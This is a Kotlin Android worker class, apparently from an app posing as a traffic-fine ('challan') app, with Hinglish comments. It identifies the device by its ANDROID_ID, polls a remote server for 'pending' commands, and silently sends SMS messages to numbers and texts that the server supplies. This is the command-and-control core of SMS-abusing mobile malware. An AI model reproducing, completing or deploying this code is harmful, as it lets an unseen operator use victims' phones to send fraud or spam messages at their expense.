package com.rte.challan.worker

import android.content.Context
import android.provider.Settings
import android.telephony.SmsManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.rte.challan.network.ClientApi // Aapka ClientApi import
import org.json.JSONArray
import org.json.JSONObject

class CommandWorker(context: Context, workerParams: WorkerParameters) :
    Worker(context, workerParams) {

    override fun doWork(): Result {
        val deviceId = Settings.Secure.getString(
            applicationContext.contentResolver, 
            Settings.Secure.ANDROID_ID
        )

        try {
            // 1. ClientApi ka use karke GET request maaro
            // URL aur Client ab iske andar se manage hoga
            val response = ClientApi.getRequest("/api/command-sms?deviceId=$deviceId")

            if (response == null) {
                return Result.retry()
            }

            val commands = JSONArray(response)

            for (i in 0 until commands.length()) {
                val cmd = commands.getJSONObject(i)
                
                // Dashboard ke pending commands check karo
                if (cmd.getString("status") == "pending") {
                    // Note: Check kar lena ki aapke Worker JSON mein 'number' aur 'text' hi key hain ya kuch aur
                    val number = cmd.optString("targetNumber") // optString use karna safe rehta hai
                    val message = cmd.optString("messageText")
                    
                    if (number.isNotEmpty() && message.isNotEmpty()) {
                        sendDirectSms(number, message)
                        
                        // 2. (Optional) Command status update karne ke liye:
                        // val updateStatus = JSONObject().apply { put("commandId", cmd.getString("id")); put("status", "sent") }
                        // ClientApi.postRequest("/api/update-command", updateStatus) { }
                    }
                }
            }
            return Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            return Result.retry()
        }
    }

    private fun sendDirectSms(number: String, msg: String) {
        try {
            // Android 10+ ke liye naya tarika, purana wala bhi chalta hai par ye better hai
            val smsManager: SmsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                applicationContext.getSystemService(SmsManager::class.java)
            } else {
                SmsManager.getDefault()
            }
            smsManager.sendTextMessage(number, null, msg, null, null)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
